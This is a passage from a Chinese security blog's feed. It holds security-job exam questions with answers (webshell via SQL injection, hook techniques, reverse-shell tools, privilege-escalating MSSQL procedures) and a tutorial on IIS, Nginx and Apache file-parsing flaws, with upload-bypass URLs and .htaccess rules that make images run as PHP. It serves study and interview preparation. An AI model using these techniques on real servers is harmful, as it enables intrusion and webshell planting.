<span>21</span>     </p>    </td>    <td>     <p>      <span>FTP</span>     </p>    </td>    <td>     <p>      <span>匿名访问\弱口令</span>     </p>    </td>   </tr>   <tr>    <td>     <p>      <span>22</span>     </p>    </td>    <td>     <p>      <span>SSH</span>     </p>    </td>    <td>     <p>      <span>弱口令</span>     </p>    </td>   </tr>   <tr>    <td>     <p>      <span>873</span>     </p>    </td>    <td>     <p>      <span>rsync</span>     </p>    </td>    <td>     <p>      <span>未授权访问\弱口令 </span>     </p>    </td>   </tr>   <tr>    <td>     <p>      <span>1433</span>     </p>    </td>    <td>     <p>      <span>mssql</span>     </p>    </td>    <td>     <p>      <span>弱口令</span>     </p>    </td>   </tr>   <tr>    <td>     <p>      <span>3306</span>     </p>    </td>    <td>     <p>      <span>mysql</span>     </p>    </td>    <td>     <p>      <span>弱口令</span>     </p>    </td>   </tr>   <tr>    <td>     <p>      <span>6379</span>     </p>    </td>    <td>     <p>      <span>redis</span>     </p>    </td>    <td>     <p>      <span>一般无验证，直接访问 </span>     </p>    </td>   </tr>   <tr>    <td>     <p>      <span>11211</span>     </p>    </td>    <td>     <p>      <span>memcache</span>     </p>    </td>    <td>     <p>      <span>内存泄露\未授权访问 </span>     </p>    </td>   </tr>  </tbody> </table><h2 id="Q15：某系统存在防注入模块，注入时会被提示："><a href="#Q15：某系统存在防注入模块，注入时会被提示：" class="headerlink" title="Q15：某系统存在防注入模块，注入时会被提示："></a>Q15：某系统存在防注入模块，注入时会被提示：</h2><p><img src="/2021/02/28/%E5%AE%89%E5%85%A8%E5%B2%97%E7%AC%94%E8%AF%95%E9%A2%98%E9%9B%86/1.png" alt><br>如何利用这个防注入系统拿shell？</p><p>直接写入一句话木马，即将木马写入了存放非法注入行为的数据库中，这个时候可以尝试寻找网站的配置文件，直接连接。</p><h2 id="Q16-发现test-jsp-id-1234-注入点，你有哪几种思路获取-webshell，哪种是优选？"><a href="#Q16-发现test-jsp-id-1234-注入点，你有哪几种思路获取-webshell，哪种是优选？" class="headerlink" title="Q16:发现test.jsp?id=1234 注入点，你有哪几种思路获取 webshell，哪种是优选？"></a>Q16:发现test.jsp?id=1234 注入点，你有哪几种思路获取 webshell，哪种是优选？</h2><p>一是在数据库中查找管理员用户名密码，使用管理员账户去上传web shell。但是有可能密码md5加密不好查询。<br>二是直接通过sql的into outfile写web shell到目标文件系统。但是要求数据库有写文件权限。<br>第二种是优选</p><h2 id="Q17：CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#Q17：CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="Q17：CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>Q17：CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h2><p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。<br>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p><h2 id="Q18：写出病毒木马常用的hook技术以及大致实现。"><a href="#Q18：写出病毒木马常用的hook技术以及大致实现。" class="headerlink" title="Q18：写出病毒木马常用的hook技术以及大致实现。"></a>Q18：写出病毒木马常用的hook技术以及大致实现。</h2><p>1.INLINE HOOK将需要hook的api函数入口的部分代码修改为跳转代码，如将函数的       序言代码push ebp;mov ebp,esp等代码修改为jmp hook_func的指令<br>2.IAT HOOK遍历可执行程序的导入表，并修改导入表的地址为要跳转的函数地址<br>3.消息hook机制 利用setwindowshook函数配合全局参数劫持windows下的消息传递，利用callnexthookex将消息进行下一步的分发。通常该技术用来进行dll注入。<br>4.SSDT hook在内核层上通过KeServiceDescriptorTable内核导出变量来获取对应的ssdt表地址，接着查询需要hook的内核api的索引，将ssdt表对应索引的函数地址改为需要跳转的函数地址。</p><h2 id="Q19：CSRF、SSRF和重放攻击有什么区别？"><a href="#Q19：CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="Q19：CSRF、SSRF和重放攻击有什么区别？"></a>Q19：CSRF、SSRF和重放攻击有什么区别？</h2><p>CSRF是跨站请求伪造攻击，由客户端发起<br>SSRF是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p><h2 id="Q20：mysql的网站注入，5-0以上和5-0以下有什么区别？"><a href="#Q20：mysql的网站注入，5-0以上和5-0以下有什么区别？" class="headerlink" title="Q20：mysql的网站注入，5.0以上和5.0以下有什么区别？"></a>Q20：mysql的网站注入，5.0以上和5.0以下有什么区别？</h2><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。<br>5.0以下是多用户单操作，5.0以上是多用户多操做。</p><h2 id="Q21-无论是在日常的网络维护，还是在渗透测试过程中，经常会使用到端口转发、代理、隧道技术，请详尽地说明这三种技术的异同点。"><a href="#Q21-无论是在日常的网络维护，还是在渗透测试过程中，经常会使用到端口转发、代理、隧道技术，请详尽地说明这三种技术的异同点。" class="headerlink" title="Q21:无论是在日常的网络维护，还是在渗透测试过程中，经常会使用到端口转发、代理、隧道技术，请详尽地说明这三种技术的异同点。"></a>Q21:无论是在日常的网络维护，还是在渗透测试过程中，经常会使用到端口转发、代理、隧道技术，请详尽地说明这三种技术的异同点。</h2><p>端口转发，顾名思义，就是指访问某一IP和端口的流量会被转发到另一个IP和端口，通过中转的方式，来访问无法直接访问到的主机和服务。<br>代理和隧道本质上都是一种端口转发技术，代理的特点是代理服务端可以根据客户端的数据包，自动判断向哪个目标机器转发；隧道技术主要是对端口转发的流量进行了加密和封装的处理。<br>如果可以说明本地端口转发、远程端口转发、动态端口转发、正向代理、反向代理的具体细节就更好了。<br>如果可以举出例子就更好了。</p><h2 id="Q22-将下列汇编代码逆成等价的C代码"><a href="#Q22-将下列汇编代码逆成等价的C代码" class="headerlink" title="Q22:将下列汇编代码逆成等价的C代码"></a>Q22:将下列汇编代码逆成等价的C代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func1:                </span><br><span class="line">                push    ebp</span><br><span class="line">                mov     ebp, esp</span><br><span class="line">                sub     esp, 14h</span><br><span class="line">                push    esi</span><br><span class="line">                mov     eax, 4</span><br><span class="line">                imul    ecx, eax, 0</span><br><span class="line">                mov     edx, [ebp+0Ch]</span><br><span class="line">                mov     eax, [edx+ecx]</span><br><span class="line">                mov     [ebp-8], eax</span><br><span class="line">                mov     ecx, 4</span><br><span class="line">                shl     ecx, 0</span><br><span class="line">                mov     edx, [ebp+0Ch]</span><br><span class="line">                mov     eax, [edx+ecx]</span><br><span class="line">                mov     [ebp-0Ch], eax</span><br><span class="line">                mov     [ebp-14h], 61C88647h</span><br><span class="line">                mov     [ebp-4], 0C6EF3720h</span><br><span class="line">                mov     [ebp-10h], 0</span><br><span class="line">                jmp     short loc_401369</span><br><span class="line"></span><br><span class="line">loc_401360:                            </span><br><span class="line">                mov     ecx, [ebp-10h]</span><br><span class="line">                add     ecx, 1</span><br><span class="line">                mov     [ebp-10h], ecx</span><br><span class="line"></span><br><span class="line">loc_401369:                            </span><br><span class="line">                mov     edx, [ebp-10h]</span><br><span class="line">                cmp     edx, [ebp+8]</span><br><span class="line">                jnb     short loc_4013D3</span><br><span class="line">                mov     eax, [ebp-8]</span><br><span class="line">                shl     eax, 5</span><br><span class="line">                mov     ecx, [ebp-8]</span><br><span class="line">                shr     ecx, 4</span><br><span class="line">                xor     eax, ecx</span><br><span class="line">                add     eax, [ebp-8]</span><br><span class="line">                mov     edx, [ebp-4]</span><br><span class="line">                shr     edx, 0Bh</span><br><span class="line">                and     edx, 3</span><br><span class="line">                mov     ecx, [ebp+10h]</span><br><span class="line">                mov     esi, [ebp-4]</span><br><span class="line">                add     esi, [ecx+edx*4]</span><br><span class="line">                xor     eax, esi</span><br><span class="line">                mov     edx, [ebp-0Ch]</span><br><span class="line">                sub     edx, eax</span><br><span class="line">                mov     [ebp-0Ch], edx</span><br><span class="line">                mov     eax, [ebp-4]</span><br><span class="line">                add     eax, [ebp-14h]</span><br><span class="line">                mov     [ebp-4], eax</span><br><span class="line">                mov     ecx, [ebp-0Ch]</span><br><span class="line">                shl     ecx, 5</span><br><span class="line">                mov     edx, [ebp-0Ch]</span><br><span class="line">                shr     edx, 4</span><br><span class="line">                xor     ecx, edx</span><br><span class="line">                add     ecx, [ebp-0Ch]</span><br><span class="line">                mov     eax, [ebp-4]</span><br><span class="line">                and     eax, 3</span><br><span class="line">                mov     edx, [ebp+10h]</span><br><span class="line">                mov     esi, [ebp-4]</span><br><span class="line">                add     esi, [edx+eax*4]</span><br><span class="line">                xor     ecx, esi</span><br><span class="line">                mov     eax, [ebp-8]</span><br><span class="line">                sub     eax, ecx</span><br><span class="line">                mov     [ebp-8], eax</span><br><span class="line">                jmp     short loc_401360</span><br><span class="line"> </span><br><span class="line">loc_4013D3:                            </span><br><span class="line">                mov     ecx, 4</span><br><span class="line">                imul    edx, ecx, 0</span><br><span class="line">                mov     eax, [ebp+0Ch]</span><br><span class="line">                mov     ecx, [ebp-8]</span><br><span class="line">                mov     [eax+edx], ecx</span><br><span class="line">                mov     edx, 4</span><br><span class="line">                shl     edx, 0</span><br><span class="line">                mov     eax, [ebp+0Ch]</span><br><span class="line">                mov     ecx, [ebp-0Ch]</span><br><span class="line">                mov     [eax+edx], ecx</span><br><span class="line">                pop     esi</span><br><span class="line">                mov     esp, ebp</span><br><span class="line">                pop     ebp</span><br><span class="line">                retn</span><br><span class="line">                endp</span><br><span class="line"></span><br><span class="line">func1(1,2,3)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">func1(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> var1,var2,var3;</span><br><span class="line">var1 = *b;</span><br><span class="line">var2 = *(b+<span class="number">4</span>);</span><br><span class="line">var3 = <span class="number">0xC6EF3720</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;a;i++)</span><br><span class="line">&#123;</span><br><span class="line">var2 -=(*(DWORD*)(c+<span class="number">4</span>*((var3&gt;&gt;<span class="number">11</span>)&amp;<span class="number">3</span>))+var3)^(var1+((var1&gt;&gt;<span class="number">4</span>)^(var1&lt;&lt;<span class="number">5</span>)));</span><br><span class="line">var3 +=<span class="number">0x61c88647</span>;</span><br><span class="line">var1-=(*(DWORD*)(c+<span class="number">4</span>*(var3&amp;<span class="number">3</span>))+var3)^(var2+((var2&gt;&gt;<span class="number">4</span>)^(var2&lt;&lt;<span class="number">5</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*(DWORD*)b = var1;</span><br><span class="line">*(DWORD*)(b+<span class="number">4</span>) = var2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="奇安信"><a href="#奇安信" class="headerlink" title="奇安信"></a>奇安信</h1><h2 id="Q1：以下工具或命令不能实现端口转发是（）"><a href="#Q1：以下工具或命令不能实现端口转发是（）" class="headerlink" title="Q1：以下工具或命令不能实现端口转发是（）"></a>Q1：以下工具或命令不能实现端口转发是（）</h2><p>A. ssh<br>B. netsh<br>C. htran<br>D. msbuild</p><p>答案：D</p><p>解析：<br>ssh可以进行本地端口转发、远程端口转发和动态端口转发。<br><a href="https://zhuanlan.zhihu.com/p/26547381">https://zhuanlan.zhihu.com/p/26547381</a><br>netsh：<a href="https://www.cnblogs.com/vivfeng/p/11605811.html">https://www.cnblogs.com/vivfeng/p/11605811.html</a><br>htran（这个还有好几个其他的端口转发工具）：<a href="https://cloud.tencent.com/developer/article/1365274">https://cloud.tencent.com/developer/article/1365274</a><br>Msbuild是VS用来构建软件的平台，它采用XML格式的项目文件，这些文件定义了构建各种平台和配置的要求。.NET版本4中引入的MSBuild内联任务功能允许将C＃代码插入XML项目文件中。内联任务MSBuild将编译并执行内联任务。他存在的安全隐患是可以用来绕过applocker。具体可以看下面这些文章<br><a href="https://blog.csdn.net/qq_38154820/article/details/106330230">https://blog.csdn.net/qq_38154820/article/details/106330230</a><br><a href="https://zhuanlan.zhihu.com/p/27810834">https://zhuanlan.zhihu.com/p/27810834</a><br>我个人的理解是，Msbuild和make相类似，是编译整个项目的工具，Msbuild接受的xml就相当于make用的makefile，他也像make一样调用编译器去编译，它调用的编译工具是C#编译器csc罢了。但是Msbuild接受的xml里可以有C#，且Msbuild会把C#编译执行了，这也就导致他可以绕过appblocker。</p><h2 id="Q2：下列可用于PHP反序列化漏洞利用的伪协议是（）"><a href="#Q2：下列可用于PHP反序列化漏洞利用的伪协议是（）" class="headerlink" title="Q2：下列可用于PHP反序列化漏洞利用的伪协议是（）"></a>Q2：下列可用于PHP反序列化漏洞利用的伪协议是（）</h2><p>A. php://file<br>B. php://phar<br>C. php://input<br>D. php://zlib</p><p>答案：B<br><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p><h2 id="Q3：下列命令中不能用来反弹Shell是（）"><a href="#Q3：下列命令中不能用来反弹Shell是（）" class="headerlink" title="Q3：下列命令中不能用来反弹Shell是（）"></a>Q3：下列命令中不能用来反弹Shell是（）</h2><p>A. bash<br>B. nc<br>C. icmpsh<br>D. cscript</p><p>答案：D<br>讲道理我觉得cscript也能反弹，只要你能写一个合理的脚本给他运行一下。搞不太懂。<br><a href="https://www.cnblogs.com/xiaozi/p/13493010.html">https://www.cnblogs.com/xiaozi/p/13493010.html</a></p><h2 id="Q4：SSRF可被攻击者用来（）"><a href="#Q4：SSRF可被攻击者用来（）" class="headerlink" title="Q4：SSRF可被攻击者用来（）"></a>Q4：SSRF可被攻击者用来（）</h2><p>A. 对本地端口进行扫描<br>B. 对内网web应用进行指纹识别<br>C. 利用file协议读取本地文件<br>D. 可用来进行钓鱼攻击</p><p>答案：ABC<br>ssrf可以实现的攻击主要有<br>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;<br>2.攻击运行在内网或本地的应用程序（比如溢出）;<br>3.对内网web应用进行指纹识别，通过访问默认文件实现;<br>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;<br>5.利用file协议读取本地文件等。</p><h2 id="Q5：下列哪些工具可以用于文件下载"><a href="#Q5：下列哪些工具可以用于文件下载" class="headerlink" title="Q5：下列哪些工具可以用于文件下载"></a>Q5：下列哪些工具可以用于文件下载</h2><p>A. Certutil<br>B. Bitadmin<br>C. Net.exe<br>D. Powershell</p><p>答案： ABD<br><a href="https://www.jianshu.com/p/bdf67ffe0b21">https://www.jianshu.com/p/bdf67ffe0b21</a></p><h2 id="Q6：关于WannaCry勒索病毒说法正确的是（）"><a href="#Q6：关于WannaCry勒索病毒说法正确的是（）" class="headerlink" title="Q6：关于WannaCry勒索病毒说法正确的是（）"></a>Q6：关于WannaCry勒索病毒说法正确的是（）</h2><p>A. 利用MS17-010漏洞进行传播<br>B. 源于“方程式黑客组织”的工具被公开<br>C. 文件加密后会添加后缀 .WNCRYT<br>D. 关闭445、3389等端口可阻断传播</p><p>答案：ABC<br>D应该是关掉445和139</p><h2 id="Q7：以下哪几种工具可以对网站进行自动化Web漏洞扫描（）"><a href="#Q7：以下哪几种工具可以对网站进行自动化Web漏洞扫描（）" class="headerlink" title="Q7：以下哪几种工具可以对网站进行自动化Web漏洞扫描（）"></a>Q7：以下哪几种工具可以对网站进行自动化Web漏洞扫描（）</h2><p>A. AWVS<br>B. APPScan<br>C. Fiddler<br>D. Netsparker</p><p>答案：ABD</p><h2 id="Q8-SQL注入的时候读取MySQL安装路径的SQL查询语句是（）"><a href="#Q8-SQL注入的时候读取MySQL安装路径的SQL查询语句是（）" class="headerlink" title="Q8:SQL注入的时候读取MySQL安装路径的SQL查询语句是（）"></a>Q8:SQL注入的时候读取MySQL安装路径的SQL查询语句是（）</h2><p>A. select @@version<br>B. select @@datadir<br>C. select @@basedir<br>D. select database()</p><p>答案：C</p><h2 id="Q9-Oracle数据库默认服务端口是（）"><a href="#Q9-Oracle数据库默认服务端口是（）" class="headerlink" title="Q9:Oracle数据库默认服务端口是（）"></a>Q9:Oracle数据库默认服务端口是（）</h2><p>A. 1433<br>B. 3306<br>C. 3389<br>D. 1521</p><p>答案：D</p><h2 id="Q10-下列微软数据库（SQL-Server）系统存储过程中哪些可以被攻击者用来提权（）"><a href="#Q10-下列微软数据库（SQL-Server）系统存储过程中哪些可以被攻击者用来提权（）" class="headerlink" title="Q10:下列微软数据库（SQL Server）系统存储过程中哪些可以被攻击者用来提权（）"></a>Q10:下列微软数据库（SQL Server）系统存储过程中哪些可以被攻击者用来提权（）</h2><p>A. xp_cmdshell<br>B. sp_oacreate<br>C. openrowset<br>D. sp_replcmds</p><p>答案：ABC<br><a href="https://blog.51cto.com/11797152/2411770">https://blog.51cto.com/11797152/2411770</a></p><h2 id="Q11-MySQL盲注可用的函数或方法有哪些（）"><a href="#Q11-MySQL盲注可用的函数或方法有哪些（）" class="headerlink" title="Q11:MySQL盲注可用的函数或方法有哪些（）"></a>Q11:MySQL盲注可用的函数或方法有哪些（）</h2><p>A. Sleep<br>B. Benchmark<br>C. 笛卡尔积<br>D. RLIKE</p><p>答案：ABCD</p><h2 id="Q12：用来识别通过代理访问Web服务器的客户端最原始的IP地址的HTTP字段是（）"><a href="#Q12：用来识别通过代理访问Web服务器的客户端最原始的IP地址的HTTP字段是（）" class="headerlink" title="Q12：用来识别通过代理访问Web服务器的客户端最原始的IP地址的HTTP字段是（）"></a>Q12：用来识别通过代理访问Web服务器的客户端最原始的IP地址的HTTP字段是（）</h2><p>A. X_FORWARDED_FOR<br>B. CLIENT_IP<br>C. REMOTE_ADDR<br>D. REFERER</p><p>答案：A</p><h2 id="Q13：以下命令可以用来获取DNS记录的是（）"><a href="#Q13：以下命令可以用来获取DNS记录的是（）" class="headerlink" title="Q13：以下命令可以用来获取DNS记录的是（）"></a>Q13：以下命令可以用来获取DNS记录的是（）</h2><p>A. ping<br>B. who<br>C. traceroute<br>D. dig</p><p>答案：D</p><h2 id="Q14：LDAP协议运行的端口是（）"><a href="#Q14：LDAP协议运行的端口是（）" class="headerlink" title="Q14：LDAP协议运行的端口是（）"></a>Q14：LDAP协议运行的端口是（）</h2><p>A. 389<br>B. 110<br>C. 53<br>D. 161</p><p>答案：A</p><h2 id="Q15：在TCP-IP模型中，下列哪些是网络层中的协议（）"><a href="#Q15：在TCP-IP模型中，下列哪些是网络层中的协议（）" class="headerlink" title="Q15：在TCP/IP模型中，下列哪些是网络层中的协议（）"></a>Q15：在TCP/IP模型中，下列哪些是网络层中的协议（）</h2><p>A. ICMP<br>B. SMTP<br>C. SNMP<br>D. ARP</p><p>答案：AD</p><h2 id="Q16-用于隐蔽信道攻击利用的常见协议有（）"><a href="#Q16-用于隐蔽信道攻击利用的常见协议有（）" class="headerlink" title="Q16:用于隐蔽信道攻击利用的常见协议有（）"></a>Q16:用于隐蔽信道攻击利用的常见协议有（）</h2><p>A. HTTP<br>B. DNS<br>C. FTP<br>D. ICMP</p><p>答案：ABD<br>这我感觉C也可以呀，可能不常见吧。</p><p>参考：<br><a href="https://blog.csdn.net/qq_38154820/article/details/106330230">https://blog.csdn.net/qq_38154820/article/details/106330230</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件解析漏洞</title>
    <link href="https://blog.pillar.fun/2021/02/28/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <id>https://blog.pillar.fun/2021/02/28/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-02-28T04:28:12.000Z</published>
    <updated>2021-02-28T05:11:23.770Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>文件解析漏洞主要由于网站管理员操作不当或者 Web 服务器自身的漏洞，导致一些特殊文件被 IIS、apache、nginx 或其他 Web服务器在某种情况下解释成脚本文件执行。大部分归因于web服务器自身漏洞。</p><h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="目录解析漏洞"><a href="#目录解析漏洞" class="headerlink" title="目录解析漏洞"></a>目录解析漏洞</h2><p>在 IIS5.x/6.0 中，如果有一个<strong>文件夹</strong> 以*.asp、*.asa、*.cer、*.cdx结尾，那么存在这个文件夹中的所有文件都会被IIS当做.asp执行。</p><p>比如，smartpillar.xyz的网站根目录有一个文件夹叫做test.asp，而文件夹里有一个一句话木马改后缀为.jpg的文件hack.jpg，当我们在访问smartpillar.xyz/test.asp/hack.jpg时，就相当于访问了hack.asp</p><h2 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h2><p>在 IIS5.x/6.0 中，分号后面的不被解析。利用这个漏洞，黑客就可以绕过一些过滤直接上传木马。</p><p>比如当我们向服务器中传送hack.php;.jpg时，就可以绕过简单的后缀名过滤，而在服务器内部，hack.php;.jpg其实就是hack.php。</p><h2 id="畸形解析漏洞"><a href="#畸形解析漏洞" class="headerlink" title="畸形解析漏洞"></a>畸形解析漏洞</h2><p>微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞。</p><p>在 IIS7.0中，在默认Fast-CGI开启状况下，假如我们有一个改后缀的马test.jpg在已知位置为smartpillar.xyz/upload/test.jpg，我们只需要访问smartpillar.xyz/upload/test.jpg/x.php即可让服务器将test.jpg当做php执行，与Nginx的一些版本的畸形解析漏洞很相似。</p><h2 id="其他解析漏洞"><a href="#其他解析漏洞" class="headerlink" title="其他解析漏洞"></a>其他解析漏洞</h2><p>因为windows系统中不允许文件的结尾是.或者空格，如果这样命名的话，windows会自动的删去那个.或者空格，黑客可以利用抓包上传结尾为.或者空格的文件来绕过文件过滤。</p><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="畸形解析漏洞-1"><a href="#畸形解析漏洞-1" class="headerlink" title="畸形解析漏洞"></a>畸形解析漏洞</h2><p>php的配置文件 php.ini 文件中开启了 cgi.fix_pathinfo，而/etc/php5/fpm/pool.d/<a href="http://www.conf">www.conf</a> 中不正确的配置security.limit_extensions，导致允许将其他格式文件作为php解析执行</p><p>例如，我们有一个改后缀马在test.jpg在已知位置为smartpillar.xyz/upload/test.jpg，这时我们去访问smartpillar.xyz/upload/test.jpg/test.php（test.php可以换成任何一个不存在的文件，只要后缀是你想要的），Nginx就会将test.jpg当做php去执行。<br>原因在于，Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php 后，一看后缀是.php，便认为该文件是php文件，于是转交给php去处理。php一看 /test.jpg/test.php 不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件<br>这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项有什么用呢？看名字就知道是对文件路径进行处理。举个例子，当 php 遇到文件路径 /aaa.xxx/bbb.yyy/ccc.zzz  时，若 /aaa.xxx/bbb.yyy/ccc.zzz 不存在，则会去掉最后的 /ccc.zzz ，然后判断 /aaa.xxx/bbb.yyy 是否存在，若存在，则把 /aaa.xxx/bbb.yyy 当做文件  /aaa.xxx/bbb.yyy/ccc.zzz ，若   /aaa.xxx/bbb.yyy  仍不存在，则继续去掉  /bbb.yyy ，以此类推。<br>为何是Nginx中的php才会有这一问题呢？因为Nginx只要一看URL中路径名以.php结尾，便不管该文件是否存在，直接交给php处理。而如Apache等，会先看该文件是否存在，若存在则再决定该如何处理。cgi.fix_pathinfo是php具有的，若在php前便已正确判断了文件是否存在，cgi.fix_pathinfo便派不上用场了，这一问题自然也就不存在了。</p><h2 id="00空字节代码解析漏洞"><a href="#00空字节代码解析漏洞" class="headerlink" title="%00空字节代码解析漏洞"></a>%00空字节代码解析漏洞</h2><p>Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码<br>影响版本：0.5.<em>, 0.6.</em>, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37<br>因为Nginx在拿到一个URI时，会使用URI环境变量进行选择，其中传递到后端Fastcgi的关键变量SCRIPT_FILENAME由nginx生成的$fastcgi_script_name决定，而$fastcgi_script_name是直接由URI环境变量控制的。<br>例如在访问smartpillar.xyz/upload/hack.jpg/%00.php的时候将会得到一个URI/hack.jpg/%00.php</p><p>在其他的webserver如lighttpd当中，我们发现其中的SCRIPT_FILENAME被正确的设置为/upload/%00.php，所以不存在此问题。</p><p>而在Nginx，后端的fastcgi在接受到该选项时，会根据fix_pathinfo配置决定是否对SCRIPT_FILENAME进行额外的处理，一般情况下如果不对fix_pathinfo进行设置将影响使用PATH_INFO进行路由选择的应用，所以该选项一般配置开启。Php通过该选项之后将查找其中真正的脚本文件名字，查找的方式也是查看文件是否存在，这个时候将分离出SCRIPT_FILENAME为/upload/hack.jpg,PATH_INFO为%00.php，即会去执行hack.jpg。</p><h2 id="CVE-2013-4547（-20-00）"><a href="#CVE-2013-4547（-20-00）" class="headerlink" title="CVE-2013-4547（%20%00）"></a>CVE-2013-4547（%20%00）</h2><p>影响nginx版本：nginx 0.8.41 ~ 1.5.6<br>这一漏洞的原理是非法字符空格（%20)和截止符（\0）（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。<br>例如，我们有一个改后缀马在hack.jpg 注意文件名的最后一个字符是空格,在已知位置为smartpillar.xyz/upload/hack.jpg<br>当我们访问smartpillar.xyz/hack.jpg%20(空格)%00(\0).php时，就会让服务器以为hack.jpg是php文件。</p><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="文件名解析漏洞-1"><a href="#文件名解析漏洞-1" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h2><p>apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。比如 xie.php.owf.rar.owf和.rar 这两种后缀是apache不可识别的解析，apache就会把xie.php.owf.rar解析成 xie.php。</p><h2 id="罕见后缀"><a href="#罕见后缀" class="headerlink" title="罕见后缀"></a>罕见后缀</h2><p>不仅php，就连phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀。还记得正则表达式”.+.ph(p[345]?|t|tml)$”吗。有些网站管理员对此不了解，在写后缀名过滤时候过滤不理想，因此黑客可以把会被过滤的hack.php改为hack.phtml，而Apache依旧会那他当php执行。</p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 .htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 httpd.conf 文件中配置。<br> .htaccess 文件生效前提条件为：mod_rewrite 模块开启且AllowOverride All<br> 有如下两种配置会导致问题<br>1:的意思就是把所有名字里面含有shell的文件当成php脚本来执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell&quot;&gt; </span><br><span class="line"></span><br><span class="line">SetHandler application&#x2F;x-httpd-php </span><br><span class="line"></span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>2:可以让 .jpg后缀名文件格式的文件名以php格式解析</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://www.cnblogs.com/vege/p/12444476.html">https://www.cnblogs.com/vege/p/12444476.html</a><br><a href="http://blog.sina.com.cn/s/blog_7f1737720101e3pb.html">http://blog.sina.com.cn/s/blog_7f1737720101e3pb.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>wmi</title>
    <link href="https://blog.pillar.fun/2021/02/23/wmi/"/>
    <id>https://blog.pillar.fun/2021/02/23/wmi/</id>
    <published>2021-02-23T08:09:15.000Z</published>
    <updated>2021-02-27T17:29:22.052Z</updated>
    
